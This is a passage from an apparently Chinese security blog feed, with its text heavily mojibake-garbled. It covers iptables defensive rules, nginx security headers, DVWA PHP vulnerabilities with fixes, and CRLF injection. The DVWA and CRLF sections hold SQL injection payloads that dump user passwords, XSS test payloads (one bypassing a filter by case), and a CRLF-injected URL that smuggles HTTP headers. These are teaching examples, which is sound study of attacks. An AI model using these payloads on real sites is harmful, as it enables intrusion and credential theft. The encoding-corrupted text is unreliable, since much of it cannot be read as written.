èµ·åŒ…è¿‡æ»¤åŠŸèƒ½çš„ä¸ºè¡¨Filterï¼Œå¯ä»¥ä¸å¡«ï¼Œä¸å¡«é»˜è®¤ä¸ºFilter 2. å‘½ä»¤é€‰é¡¹ é€‰é¡¹å åŠŸèƒ½åŠç‰¹ç‚¹ -A åœ¨æŒ‡å®šé“¾çš„æœ«å°¾æ·»åŠ ï¼ˆâ€“appendï¼‰ä¸€æ¡æ–°çš„è§„åˆ™ -D åˆ é™¤ï¼ˆâ€“deleteï¼‰æŒ‡å®šé“¾ä¸­çš„æŸä¸€æ¡è§„åˆ™ï¼ŒæŒ‰è§„åˆ™åºå·æˆ–å†…å®¹ç¡®å®šè¦åˆ é™¤çš„è§„åˆ™ -I åœ¨æŒ‡å®šé“¾ä¸­æ’å…¥ï¼ˆâ€“insertï¼‰ä¸€æ¡æ–°çš„è§„åˆ™ï¼Œé»˜è®¤åœ¨é“¾çš„å¼€å¤´æ’å…¥ -R ä¿®æ”¹ã€æ›¿æ¢ï¼ˆâ€“replaceï¼‰æŒ‡å®šé“¾ä¸­çš„ä¸€æ¡è§„åˆ™ï¼ŒæŒ‰è§„åˆ™åºå·æˆ–å†…å®¹ç¡®å®š -L åˆ—å‡ºï¼ˆâ€“listï¼‰æŒ‡å®šé“¾ä¸­çš„æ‰€æœ‰çš„è§„åˆ™è¿›è¡ŒæŸ¥çœ‹ï¼Œé»˜è®¤åˆ—å‡ºè¡¨ä¸­æ‰€æœ‰é“¾çš„å†…å®¹ -F æ¸…ç©ºï¼ˆâ€“flushï¼‰æŒ‡å®šé“¾ä¸­çš„æ‰€æœ‰è§„åˆ™ï¼Œé»˜è®¤æ¸…ç©ºè¡¨ä¸­æ‰€æœ‰é“¾çš„å†…å®¹ -N æ–°å»ºï¼ˆâ€“new-chainï¼‰ä¸€æ¡ç”¨æˆ·è‡ªå·±å®šä¹‰çš„è§„åˆ™é“¾ -X åˆ é™¤æŒ‡å®šè¡¨ä¸­ç”¨æˆ·è‡ªå®šä¹‰çš„è§„åˆ™é“¾ï¼ˆâ€“delete-chainï¼‰ -P è®¾ç½®æŒ‡å®šé“¾çš„é»˜è®¤ç­–ç•¥ï¼ˆâ€“policyï¼‰ -n ç”¨æ•°å­—å½¢å¼ï¼ˆâ€“numericï¼‰æ˜¾ç¤ºè¾“å‡ºç»“æœï¼Œè‹¥æ˜¾ç¤ºä¸»æœºçš„ IPåœ°å€è€Œä¸æ˜¯ä¸»æœºå -P è®¾ç½®æŒ‡å®šé“¾çš„é»˜è®¤ç­–ç•¥ï¼ˆâ€“policyï¼‰ -v æŸ¥çœ‹è§„åˆ™åˆ—è¡¨æ—¶æ˜¾ç¤ºè¯¦ç»†ï¼ˆâ€“verboseï¼‰çš„ä¿¡æ¯ -V æŸ¥çœ‹iptableså‘½ä»¤å·¥å…·çš„ç‰ˆæœ¬ï¼ˆâ€“Versionï¼‰ä¿¡æ¯ -h æŸ¥çœ‹å‘½ä»¤å¸®åŠ©ä¿¡æ¯ï¼ˆâ€“helpï¼‰ â€“line-number æŸ¥çœ‹è§„åˆ™åˆ—è¡¨æ—¶ï¼ŒåŒæ—¶æ˜¾ç¤ºè§„åˆ™åœ¨é“¾ä¸­çš„é¡ºåºå· 3. é“¾å å¯ä»¥æ ¹æ®æ•°æ®æµå‘æ¥ç¡®å®šå…·ä½“ä½¿ç”¨å“ªä¸ªé“¾ï¼Œåœ¨Filterä¸­çš„ä½¿ç”¨æƒ…å†µå¦‚ä¸‹ï¼š INPUTé“¾ â€“ å¤„ç†æ¥è‡ªå¤–éƒ¨çš„æ•°æ®ã€‚ OUTPUTé“¾ â€“ å¤„ç†å‘å¤–å‘é€çš„æ•°æ®ã€‚ FORWARDé“¾ â€“ å°†æ•°æ®è½¬å‘åˆ°æœ¬æœºçš„å…¶ä»–ç½‘å¡è®¾å¤‡ä¸Šã€‚ 4. æ¡ä»¶åŒ¹é… æ¡ä»¶åŒ¹é…åˆ†ä¸ºåŸºæœ¬åŒ¹é…å’Œæ‰©å±•åŒ¹é…ï¼Œæ‰©å±•åŒ¹é…åˆåˆ†ä¸ºéšå¼æ‰©å±•å’Œæ˜¾ç¤ºæ‰©å±•ã€‚ a)åŸºæœ¬åŒ¹é…åŒ…æ‹¬ï¼š åŒ¹é…å‚æ•° è¯´æ˜ -p æŒ‡å®šè§„åˆ™åè®®ï¼Œå¦‚tcp, udp,icmpç­‰ï¼Œå¯ä»¥ä½¿ç”¨allæ¥æŒ‡å®šæ‰€æœ‰åè®® -s æŒ‡å®šæ•°æ®åŒ…çš„æºåœ°å€å‚æ•°ï¼Œå¯ä»¥ä½¿IPåœ°å€ã€ç½‘ç»œåœ°å€ã€ä¸»æœºå -d æŒ‡å®šç›®çš„åœ°å€ -i è¾“å…¥æ¥å£ -o è¾“å‡ºæ¥å£ b)éšå¼æ‰©å±•åŒ…æ‹¬ï¼š c)å¸¸ç”¨æ˜¾å¼æ‰©å±• 5. ç›®æ ‡å€¼ æ•°æ®åŒ…æ§åˆ¶æ–¹å¼åŒ…æ‹¬å››ç§ä¸ºï¼š ACCEPTï¼šå…è®¸æ•°æ®åŒ…é€šè¿‡ã€‚ DROPï¼šç›´æ¥ä¸¢å¼ƒæ•°æ®åŒ…ï¼Œä¸ç»™å‡ºä»»ä½•å›åº”ä¿¡æ¯ã€‚ REJECTï¼šæ‹’ç»æ•°æ®åŒ…é€šè¿‡ï¼Œå¿…é¡»æ—¶ä¼šç»™æ•°æ®å‘é€ç«¯ä¸€ä¸ªå“åº”ä¿¡æ¯ã€‚ LOGï¼šåœ¨/var/log/messages æ–‡ä»¶ä¸­è®°å½•æ—¥å¿—ä¿¡æ¯ï¼Œç„¶åå°†æ•°æ®åŒ…ä¼ é€’ç»™ä¸‹ä¸€æ¡è§„åˆ™ã€‚ QUEUEï¼šé˜²ç«å¢™å°†æ•°æ®åŒ…ç§»äº¤åˆ°ç”¨æˆ·ç©ºé—´ RETURNï¼šé˜²ç«å¢™åœæ­¢æ‰§è¡Œå½“å‰é“¾ä¸­çš„åç»­Rulesï¼Œå¹¶è¿”å›åˆ°è°ƒç”¨é“¾(the calling chain) 0x04 Iptableså¸¸è§å‘½ä»¤ åˆ é™¤iptablesç°æœ‰è§„åˆ™ iptables â€“F æŸ¥çœ‹iptablesè§„åˆ™ iptables â€“Lï¼ˆiptables â€“L â€“v -nï¼‰ å¢åŠ ä¸€æ¡è§„åˆ™åˆ°æœ€å iptables -A INPUT -i eth0 -p tcp â€“dport 80 -m state â€“state NEW,ESTABLISHED -j ACCEPT æ·»åŠ ä¸€æ¡è§„åˆ™åˆ°æŒ‡å®šä½ç½® iptables -I INPUT 2 -i eth0 -p tcp â€“dport 80 -m state â€“state NEW,ESTABLISHED -j ACCEPT åˆ é™¤ä¸€æ¡è§„åˆ™ iptabels -D INPUT 2 ä¿®æ”¹ä¸€æ¡è§„åˆ™ iptables -R INPUT 3 -i eth0 -p tcp â€“dport 80 -m state â€“state NEW,ESTABLISHED -j ACCEPT è®¾ç½®é»˜è®¤ç­–ç•¥ iptables -P INPUT DROP å…è®¸è¿œç¨‹ä¸»æœºè¿›è¡ŒSSHè¿æ¥ iptables -A INPUT -i eth0 -p tcp â€“dport 22 -m state â€“state NEW,ESTABLISHED -j ACCEPT iptables -A OUTPUT -o eth0 -p tcp â€“sport 22 -m state â€“state ESTABLISHED -j ACCEPT å…è®¸æœ¬åœ°ä¸»æœºè¿›è¡ŒSSHè¿æ¥ iptables -A OUTPUT -o eth0 -p tcp â€“dport 22 -m state â€“state NEW,ESTABLISHED -j ACCEPT iptables -A INTPUT -i eth0 -p tcp â€“sport 22 -m state â€“state ESTABLISHED -j ACCEPT å…è®¸HTTPè¯·æ±‚ iptables -A INPUT -i eth0 -p tcp â€“dport 80 -m state â€“state NEW,ESTABLISHED -j ACCEPT iptables -A OUTPUT -o eth0 -p tcp â€“sport 80 -m state â€“state ESTABLISHED -j ACCEPT é™åˆ¶ping 192.168.146.3ä¸»æœºçš„æ•°æ®åŒ…æ•°ï¼Œå¹³å‡2/sä¸ªï¼Œæœ€å¤šä¸èƒ½è¶…è¿‡3ä¸ª iptables -A INPUT -i eth0 -d 192.168.146.3 -p icmp â€“icmp-type 8 -m limit â€“limit 2/second â€“limit-burst 3 -j ACCEPT é™åˆ¶SSHè¿æ¥é€Ÿç‡(é»˜è®¤ç­–ç•¥æ˜¯DROP) iptables -I INPUT 1 -p tcp â€“dport 22 -d 192.168.146.3 -m state â€“state ESTABLISHED -j ACCEPT iptables -I INPUT 2 -p tcp â€“dport 22 -d 192.168.146.3 -m limit â€“limit 2/minute â€“limit-burst 2 -m state â€“state NEW -j ACCEPT 0x05 ä½¿ç”¨iptablesæŠµæŠ—å¸¸è§æ”»å‡»1.é˜²æ­¢synæ”»å‡» æ€è·¯ä¸€ï¼šé™åˆ¶synçš„è¯·æ±‚é€Ÿåº¦ï¼ˆè¿™ä¸ªæ–¹å¼éœ€è¦è°ƒèŠ‚ä¸€ä¸ªåˆç†çš„é€Ÿåº¦å€¼ï¼Œä¸ç„¶ä¼šå½±å“æ­£å¸¸ç”¨æˆ·çš„è¯·æ±‚ï¼‰ iptables -N syn-flood iptables -A INPUT -p tcp --syn -j syn-flood iptables -A syn-flood -m limit --limit 1/s --limit-burst 4 -j RETURN iptables -A syn-flood -j DROP æ€è·¯äºŒï¼šé™åˆ¶å•ä¸ªipçš„æœ€å¤§synè¿æ¥æ•° iptables â€“A INPUT â€“i eth0 â€“p tcp --syn -m connlimit --connlimit-above 15 -j DROP 2. é˜²æ­¢DOSæ”»å‡» åˆ©ç”¨recentæ¨¡å—æŠµå¾¡DOSæ”»å‡» iptables -I INPUT -p tcp -dport 22 -m connlimit --connlimit-above 3 -j DROP å•ä¸ªIPæœ€å¤šè¿æ¥3ä¸ªä¼šè¯ iptables -I INPUT -p tcp --dport 22 -m state --state NEW -m recent --set --name SSH åªè¦æ˜¯æ–°çš„è¿æ¥è¯·æ±‚ï¼Œå°±æŠŠå®ƒåŠ å…¥åˆ°SSHåˆ—è¡¨ä¸­ Iptables -I INPUT -p tcp --dport 22 -m state NEW -m recent --update --seconds 300 --hitcount 3 --name SSH -j DROP 5åˆ†é’Ÿå†…ä½ çš„å°è¯•æ¬¡æ•°è¾¾åˆ°3æ¬¡ï¼Œå°±æ‹’ç»æä¾›SSHåˆ—è¡¨ä¸­çš„è¿™ä¸ªIPæœåŠ¡ã€‚è¢«é™åˆ¶5åˆ†é’Ÿåå³å¯æ¢å¤è®¿é—®ã€‚ 3. é˜²æ­¢å•ä¸ªipè®¿é—®é‡è¿‡å¤§ iptables -I INPUT -p tcp --dport 80 -m connlimit --connlimit-above 30 -j DROP 4. æœ¨é©¬åå¼¹ iptables â€“A OUTPUT â€“m state --state NEW â€“j DROP 5. é˜²æ­¢pingæ”»å‡» iptables -A INPUT -p icmp --icmp-type echo-request -m limit --limit 1/m -j ACCEPT å‚è€ƒèµ„æ–™ï¼šä¹Œäº‘-iptablesåŸºç¡€çŸ¥è¯†]]></content>
      <tags>
        <tag>è¿ç»´</tag>
        <tag>iptables</tag>
        <tag>linux</tag>
        <tag>åº”æ€¥å“åº”</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HTTP header å®‰å…¨é…ç½®]]></title>
    <url>%2F2016%2F09%2F02%2Fheader%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[ç°ä»£æµè§ˆå™¨æä¾›äº†ä¸€äº›å®‰å…¨ç›¸å…³çš„å“åº”å¤´ï¼Œä½¿ç”¨è¿™äº›å“åº”å¤´ä¸€èˆ¬åªéœ€è¦ä¿®æ”¹æœåŠ¡å™¨é…ç½®å³å¯ï¼Œä¸éœ€è¦ä¿®æ”¹ç¨‹åºä»£ç ï¼Œæˆæœ¬å¾ˆä½ã€‚ å®‰å…¨æ–¹é¢çš„ HTTP Header é˜²å¾¡ XSS (Cross Site Scripting)ï¼š Content-Security-Policy Set-Cookie: HttpOnly X-XSS-Protection X-Download-Options Nginxåœ¨nginx.confçš„serveræ®µä¸­åŠ å…¥ï¼š add_header X-XSS-Protection â€œ1; mode=blockâ€; åœ¨Nginx.confçš„serveræ®µåŠ å…¥ï¼š add_header Content-Security-Policy: script-src &#039;self&#039; https://apis.google.com é˜²å¾¡ Clickjackingï¼š X-Frame-Options add_header X-Frame-Options: DENY Nginxä¸­ç¼–è¾‘nginx.conf ï¼Œåœ¨serveræ®µåŠ å…¥ï¼š add_header X-Frame-Options â€œSAMEORIGINâ€; å¼ºåŒ– HTTPSæœºåˆ¶ï¼š Set-Cookie: Secure Strict-Transport-Security åœ¨Nginx.confçš„serveræ®µåŠ å…¥ï¼š add_header Strict-Transport-Security â€œmax-age=31536000; includeSubdomains;â€; é¿å…æµè§ˆå™¨è¯¯åˆ¤æ–‡ä»¶å½¢å¼ï¼š X-Content-Type-Options åœ¨Nginx.confçš„serveræ®µåŠ å…¥ï¼š add_header X-Content-Type-Options nosniff; ä¿è¯ç½‘ç«™èµ„æºè¢«ä»»æ„å­˜å–ï¼š Access-Control-Allow-Originï¼ˆæ­¤ header è‹¥è¨­å®šéŒ¯èª¤æœƒé©å¾—å…¶åï¼ï¼‰ X-Permitted-Cross-Domain-Policies add_header ccess-Control-Allow-Origin: http://foo.exampleAccess-Control-Allow-Origin: * Cookieä¿æŠ¤ HttpOnlyï¼Œä¼šé˜»æ­¢XSSæ”»å‡»å°†ä½ çš„ç”¨æˆ·cookieå‘ç»™é»‘å®¢ Secure,å±æ€§èƒ½è®©Cookieé€šè¿‡HTTPSè¿æ¥ï¼Œè€Œä¸æ˜¯HTTPï¼Œè¿™æ ·ï¼Œèƒ½å¤Ÿè®¿é—®ä½ çš„ç½‘ç»œçš„é»‘å®¢æ— æ³•è¯»å–æœªåŠ å¯†çš„Cookieã€‚ add_header Set-Cookie: HttpOnly add_header Set-Cookie: Secure]]></content>
      <tags>
        <tag>æ¸—é€æµ‹è¯•</tag>
        <tag>XSS</tag>
        <tag>å®‰å…¨å¼€å‘</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ä»DVWAä¸­å­¦ä¹ PHPå¸¸è§æ¼æ´åŠé˜²å¾¡]]></title>
    <url>%2F2016%2F09%2F01%2F%E4%BB%8EDVWA%E4%B8%AD%E5%AD%A6%E4%B9%A0PHP%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%8F%8A%E9%98%B2%E5%BE%A1%2F</url>
    <content type="text"><![CDATA[0x00 å‰è¨€â€œå®‰å…¨æ˜¯ä¸€ä¸ªæ•´ä½“ï¼Œä¿è¯å®‰å…¨ä¸åœ¨äºå¼ºå¤§çš„åœ°æ–¹æœ‰å¤šå¼ºå¤§ è€Œåœ¨äºçœŸæ­£è–„å¼±çš„åœ°æ–¹åœ¨å“ªé‡Œâ€â€“å‰‘å¿ƒ æ¼æ´å½¢æˆçš„åŸå› å°±æ˜¯æ¥å—äº†ä¸å®‰å…¨çš„å˜é‡è¾“å…¥ï¼Œåˆæ²¡å¾—åˆ°æœ‰æ•ˆçš„è¿‡æ»¤ï¼Œæœ€åè¿›å…¥ä¸€äº›å¯¹æ•æ„Ÿçš„å‡½æ•°å°±ä¼šå¯¹å®‰å…¨é€ æˆå¨èƒã€‚æ¯”å¦‚å‡ºç°åœ¨mysql_query()å‡½æ•°å¯èƒ½å°±ä¼šé€ æˆSQLæ³¨å…¥æ¼æ´ï¼Œå‡ºç°åœ¨eval()ä»¥åŠpreg_replace()ä¸­å¯èƒ½å¯¼è‡´ä»£ç çš„æ‰§è¡Œã€‚ ä¸»è¦ä»‹ç»DVWAä¸Šçš„æ¼æ´åŠä¿®å¤æ–¹æ¡ˆï¼šDVWAä¸‹è½½åœ°å€ 0x01 SQLæ³¨å…¥æ¼æ´lowçš„çº§åˆ«ä¸‹$idå˜é‡æ²¡æœ‰ç»è¿‡ä»»ä½•çš„è¿‡æ»¤ï¼Œç›´æ¥ä¼ å…¥äº†sqlè¯­å¥ï¼Œé€ æˆå­—ç¬¦å‹æ³¨å…¥ POC: â€˜ union select user,password from users# SQLè¯­å¥ä¸ºï¼š SELECT first_name, last_name FROM users WHERE user_id = â€˜â€™ union select user,password from users# mediumçº§åˆ«ä¸‹è™½ç„¶$idç»è¿‡äº†mysql_real_escape_stringè½¬ä¹‰äº†â€™ï¼Œå¯æ˜¯å› ä¸ºåé¢çš„SQLè¯­å¥$idæ²¡æœ‰å•å¼•å·ä¿æŠ¤ï¼Œä¼šè¢«ç³»ç»Ÿè®¤ä¸ºæ˜¯æ•°å€¼å‹ï¼Œå¯¼è‡´æ•°å€¼å‹æ³¨å…¥ POC: 1 union select user,password from users SQLè¯­å¥ä¸ºï¼š SELECT first_name, last_name FROM users WHERE user_id = 1 union select user,password from users SQLæ³¨å…¥ä¿®è¡¥æ–¹æ³• å­—ç¬¦å‹æ³¨å…¥æ¼æ´ä¿®è¡¥æ–¹æ³•ï¼š PHP5.3ä¹‹å‰ç‰ˆæœ¬åœ¨php.iniä¸­è®¾ç½®magic_quotes_gpc=On; magic_quotes_quotes_gpcä¼šå¯¹ä¼ å…¥çš„$_POST,$_GET,$_SERVERé‡Œçš„ â€˜,â€,\è¿›è¡Œè½¬ä¹‰ã€‚ ä½†æ˜¯PHP5.4ä¹‹åï¼Œmagic_quotes_quotes_gpcå°±è¢«åºŸé™¤äº†ã€‚ è¿˜è¦ä½¿ç”¨mysql_real_escape_string()æˆ–addslashes()å¯¹ä¼ å…¥å‚æ•°è¿›è¡Œè¿‡æ»¤ï¼Œæˆ–è€…ä½¿ç”¨str_replace()å¯¹ä¸€äº›å…³é”®è¯è¿›è¡Œæ›¿æ¢ã€‚ ä½†æ˜¯addslashes()å’Œmysql_real_escape_string()åœ¨æ•°æ®åº“å­—ç¬¦é›†è®¾ä¸ºGBKæ—¶æ˜¯å¯èƒ½è¢«ç»•è¿‡çš„ã€‚ å¦‚æœæ•°æ®åº“å­—ç¬¦é›†æ˜¯GBKçš„æƒ…å†µä¸‹ï¼Œå¯ä»¥æŠŠ $mysqli-&gt;query(&apos;SET NAMES gbk&apos;); ä¿®æ”¹ä¸ºï¼š $mysqli-&gt;set_charset(&apos;gbk&apos;); æ•°å€¼å‹æ³¨å…¥ï¼š æ•°å€¼å‹æ³¨å…¥æ¯”è¾ƒå¥½ä¿®è¡¥ï¼Œåªéœ€è¦åˆ¤æ–­ä¼ å…¥çš„å˜é‡æ˜¯å¦ä¸ºæ•°å€¼å‹å°±å¯ä»¥äº†(æˆ–è€…å¼ºè¡Œæ”¹æˆæ•°å€¼å‹mysql_numrows) 0x02 XSSæ¼æ´é»‘å®¢å¾€Webé¡µé¢é‡Œæ’å…¥æ¶æ„htmlä»£ç ï¼Œå½“ç”¨æˆ·æµè§ˆè¯¥é¡µä¹‹æ—¶ï¼ŒåµŒå…¥å…¶ä¸­Webé‡Œé¢çš„htmlä»£ç ä¼šè¢«æ‰§è¡Œï¼Œä»è€Œè¾¾åˆ°é»‘å®¢çš„ç‰¹æ®Šç›®çš„ï¼Œæ¯”å¦‚çªƒå–ç”¨æˆ·cookies.æˆ–è€…è¿›è¡Œå…¶ä»–æ“ä½œã€‚ lowçº§åˆ«ä¸‹$message,$nameä¸¤ä¸ªå˜é‡ä»$_POSTä¼ å…¥,åªæ˜¯ç»è¿‡ä¸€äº›ç‰¹æ®Šå­—ç¬¦çš„è½¬æ¢ã€‚å¹¶æ²¡æœ‰å¯¹å°–æ‹¬å·è¿›è¡Œè½¬ä¹‰,æ‰€ä»¥è¿˜æ˜¯é€ æˆäº†XSSçš„äº§ç”Ÿã€‚ POC: &lt;script&gt;alert(1)&lt;script&gt; mediumçº§åˆ«ä¸‹ï¼Œè™½ç„¶å¯¹$messageè¿›è¡Œäº†å°–æ‹¬å·è½¬ä¹‰ï¼Œè€Œä¸”å¯¹&lt;script&gt;è¿›è¡Œäº†æ›¿æ¢ï¼Œä½†æ˜¯$nameæ²¡æœ‰è¿›è¡Œè½¬ä¹‰ï¼Œè€Œä¸”è·¨ç«™è„šæœ¬å¯ä»¥ç”¨å¤šç§æ ‡ç­¾ï¼Œå¦‚&lt;img /&gt;,ç­‰â€¦ã€‚Nameçš„&lt;input /&gt;é™åˆ¶äº†maxlength=â€˜10â€™çš„é•¿åº¦ï¼Œä½†æ˜¯æˆ‘ä»¬çš„é˜²å¾¡å¯¹è±¡æ˜¯ç²¾é€šæŠ€æœ¯çš„é»‘å®¢ã€‚è¿™ç§htmlä¸‹çš„é•¿åº¦é™åˆ¶æ˜¯å¯ä»¥ç›´æ¥é€šè¿‡æµè§ˆå™¨ä¿®æ”¹..ç„¶åé€šè¿‡å¤§å°å†™æˆåŠŸç»•è¿‡str_replace()ï¼Œæ’å…¥XSS. POC: &lt;SCript&gt;alert(1)&lt;/SCript&gt; XSSä¿®å¤æ–¹æ³• åœ¨å°†ä¸å¯ä¿¡æ•°æ®æ’å…¥åˆ°HTMLæ ‡ç­¾ä¹‹é—´æ—¶ï¼Œå¯¹è¿™äº›æ•°æ®è¿›è¡ŒHTML Entityç¼–ç  åœ¨å°†ä¸å¯ä¿¡æ•°æ®æ’å…¥åˆ°HTMLå±æ€§é‡Œæ—¶ï¼Œå¯¹è¿™äº›æ•°æ®è¿›è¡ŒHTMLå±æ€§ç¼–ç  åœ¨å°†ä¸å¯ä¿¡æ•°æ®æ’å…¥åˆ°SCRIPTé‡Œæ—¶ï¼Œå¯¹è¿™äº›æ•°æ®è¿›è¡ŒSCRIPTç¼–ç  åœ¨å°†ä¸å¯ä¿¡æ•°æ®æ’å…¥åˆ°Styleå±æ€§é‡Œæ—¶ï¼Œå¯¹è¿™äº›æ•°æ®è¿›è¡ŒCSSç¼–ç  åœ¨å°†ä¸å¯ä¿¡æ•°æ®æ’å…¥åˆ°HTML URLé‡Œæ—¶ï¼Œå¯¹è¿™äº›æ•°æ®è¿›è¡ŒURLç¼–ç  ä½¿ç”¨å¯Œæ–‡æœ¬æ—¶ï¼Œä½¿ç”¨XSSè§„åˆ™å¼•æ“è¿›è¡Œç¼–ç è¿‡æ»¤ å…¶å®ä½¿ç”¨htmlspecialchars()åœ¨è¾“å‡ºæ—¶å¯¹è¾“å‡ºå†…å®¹è¿›è¡Œè½¬ä¹‰ã€‚åœ¨è¾“å‡ºæ—¶è¿›è¡Œè½¬ä¹‰æ¯”è¾“å…¥æ—¶è¿›è¡Œè½¬ä¹‰æ•ˆæœæ›´å¥½ï¼Œå› ä¸ºå¯ä»¥ç¡®ä¿æ•°æ®åœ¨å…¥åº“æ—¶æ˜¯å®Œæ•´çš„â€¦.ä¸ç„¶ä¸¢å¤±æ•°æ®ã€‚ 0x03 ä»»æ„å‘½ä»¤æ‰§è¡Œæ¼æ´å‚è€ƒæ–‡ç« ï¼šå‘½ä»¤æ‰§è¡Œæ¼æ´æ€»ç»“ 0x04 æš´åŠ›ç ´è§£åŠ ä¸ªgoogleéªŒè¯ç ï¼Œä¿è¯æ²¡æœ‰ç¨‹åºèƒ½è¯†åˆ«å‡ºæ¥â€¦ 0x05 æ–‡ä»¶åŒ…å«æ¼æ´å‚è€ƒæ–‡ç« ï¼šæ–‡ä»¶åŒ…å«æ¼æ´æ€»ç»“]]></content>
      <tags>
        <tag>çˆ†ç ´</tag>
        <tag>æ¸—é€æµ‹è¯•</tag>
        <tag>XSS</tag>
        <tag>ç¼–ç¨‹</tag>
        <tag>PHP</tag>
        <tag>å‘½ä»¤æ‰§è¡Œ</tag>
        <tag>SQLæ³¨å…¥</tag>
        <tag>å®‰å…¨å¼€å‘</tag>
        <tag>DVWA</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CRLFæ¼æ´]]></title>
    <url>%2F2016%2F08%2F31%2FCRLF-injection%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[0x00 ç®€ä»‹åœ¨æ–‡æœ¬å¤„ç†ä¸­, CR, LF, CR/LFæ˜¯ä¸åŒæ“ä½œç³»ç»Ÿä¸Šä½¿ç”¨çš„æ¢è¡Œç¬¦.Doså’Œwindowsé‡‡ç”¨å›è½¦+æ¢è¡ŒCR/LFè¡¨ç¤ºä¸‹ä¸€è¡Œ,è€ŒUNIX/Linuxé‡‡ç”¨æ¢è¡Œç¬¦LFè¡¨ç¤ºä¸‹ä¸€è¡Œï¼Œè‹¹æœæœº(MAC OSç³»ç»Ÿ)åˆ™é‡‡ç”¨å›è½¦ç¬¦CRè¡¨ç¤ºä¸‹ä¸€è¡Œ.CRç”¨ç¬¦å·â€™râ€™è¡¨ç¤º, åè¿›åˆ¶ASCIIä»£ç æ˜¯13, åå…­è¿›åˆ¶ä»£ç ä¸º0x0D; LFä½¿ç”¨â€™nâ€™ç¬¦å·è¡¨ç¤º, ASCIIä»£ç æ˜¯10, åå…­åˆ¶ä¸º0x0A.æ‰€ä»¥Windowså¹³å°ä¸Šæ¢è¡Œåœ¨æ–‡æœ¬æ–‡ä»¶ä¸­æ˜¯ä½¿ç”¨ 0d 0a ä¸¤ä¸ªå­—èŠ‚è¡¨ç¤º, è€ŒUNIXå’Œè‹¹æœå¹³å°ä¸Šæ¢è¡Œåˆ™æ˜¯ä½¿ç”¨0aæˆ–0dä¸€ä¸ªå­—èŠ‚è¡¨ç¤º. 0x01 åŸç†æˆ‘ä»¬éƒ½çŸ¥é“ï¼ŒHTTPåè®®æ˜¯ä¾é ä¸¤ä¸ªCRLFï¼Œå³\r\næ¥åˆ†å‰²HTTPå¤´éƒ¨åŠå“åº”ä½“ã€‚åŸºäºè¿™ä¸ªè®¤çŸ¥ï¼Œå¯ä»¥æ¨å‡ºï¼ŒHRSé—®é¢˜æ˜¯ç”±äºæœåŠ¡ç«¯ç¨‹åºæ²¡æœ‰è¿‡æ»¤æ‰å¤´éƒ¨ä¸­çš„ç‰¹æ®Šå­—ç¬¦%0D%0Aï¼Œç›´æ¥è¾“å‡ºåˆ°äº†è¿”å›çš„æ•°æ®ä¸­ï¼Œå¯¼è‡´é”™è¯¯çš„è§£æã€‚è€Œåœ¨æ—¥å¸¸å¼€å‘ä¸­ï¼Œæœ€å¸¸è§çš„è«è¿‡äºæœ‰ä»¥ä¸‹çš„ä¸¤ç§åŠŸèƒ½ï¼ˆ1ï¼‰URLè·³è½¬ï¼ˆ2ï¼‰Cookieçš„è®¾ç½®ä¸­å‡ºç°ã€‚ ä¸€æ—¦æˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶httpå¤´ï¼Œé€šè¿‡æ³¨å…¥ä¸€äº›CRLFè¿™æ ·å°±å¯ä»¥æ§åˆ¶headerå’Œbodyçš„åˆ†å‰²çº¿ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥å‘bodyæˆ–æ˜¯headerä¸­æ³¨å…¥äº›ä¸œè¥¿äº†ã€‚æ‰€ä»¥CRLF Injectionåˆå«HTTP Response Splittingï¼Œç®€ç§°HRSã€‚ 0x02 å±å®³å¦‚æœç›®æ ‡ç½‘é¡µå­˜åœ¨å“åº”å¤´éƒ¨CRLFæ³¨å…¥ï¼Œåœ¨HTTPå“åº”å¤´æ³¨å…¥å›è½¦æ¢è¡Œç¬¦ï¼Œå°±å¯ä»¥æ³¨å…¥å¤´éƒ¨ï¼šX-XSS-Protection: 0 HTTP headerçš„å®šä¹‰å°±æ˜¯åŸºäºè¿™æ ·çš„&quot;Key: Value&quot;çš„ç»“æ„ï¼Œç”¨CRLFå‘½ä»¤è¡¨ç¤ºä¸€è¡Œçš„ç»“å°¾ã€‚ &quot;Location:&quot;å¤´ç”¨æ¥è¡¨ç¤ºé‡å®šå‘çš„URLåœ°å€ï¼Œ &quot;Set-Cookie:&quot;å¤´ç”¨æ¥è®¾ç½®cookiesã€‚ å¦‚æœç”¨æˆ·çš„è¾“å…¥ç»è¿‡éªŒè¯ï¼Œå…¶ä¸­å­˜åœ¨CRLFçš„å­—ç¬¦å°±å¯ä»¥è¢«ç”¨æ¥è¾¾åˆ°æ¬ºéª—çš„ç›®çš„ã€‚ 0x03 å®ä¾‹æµ‹è¯•ä»£ç ï¼šindex.php &lt;?php /* *@åšå®¢ï¼šhttp://byd.dropsec.xyz/ *@Authorï¼šw2n1ck */ echo &apos;&lt;pre&gt;&apos;; print_r(file(&quot;http://www.site1.com/api?test=$test&quot;/images/test.png)); echo &apos;&lt;/pre&gt;&apos;; ?&gt; å¦‚æœæ”»å‡»è€…è¿™æ ·å‘é€ï¼š index.php?test=test%20HTTP /1.0%0D%0AHost%3A%20www.site2.com%0D%0AUser-Agent%3A%20joy_nick/0.0%0D%0AReferer%3A%20http%3A%2F%2Fwww.test.org%2F%0D%0ACookie%3A%20user%3Djoy_nick%0D%0A%0D%0AHTTP/1.0%0D%0AHost%3A%20http%3A%2F%2Fwww.SITE1.com%0D%0AUser-Agent%3A%20PHP/4.1.2 (å¿…é¡»åœ¨ä¸€è¡Œä¸Š) è¿™ä¸ª HTTP è¯·æ±‚å°†è¢«å‘é€ç»™ www.site1.com: GET /api?test=test HTTP/1.0 Host: www.site2.com User-Agent: joy_nick/0.0 Referer: http://www.test.org/ Cookie: user=joy_nick HTTP/1.0 Host: www.site1.st User-Agent: PHP/4.1.2 ä½ å¯ä»¥çœ‹åˆ°ï¼ŒçœŸå®çš„PHPå¤´ä¿¡æ¯è¢«æ­£ç¡®å‘é€ï¼Œä½†è¢«æœåŠ¡å™¨å¿½ç•¥äº†ï¼Œå› ä¸ºåœ¨å®ƒä»¬æŒ‡å‘çš„æŠ¥å¤´ç»“æŸä¹‹å‰æˆ‘ä»¬å‘é€ä¸¤ä¸ªCRLFã€‚ 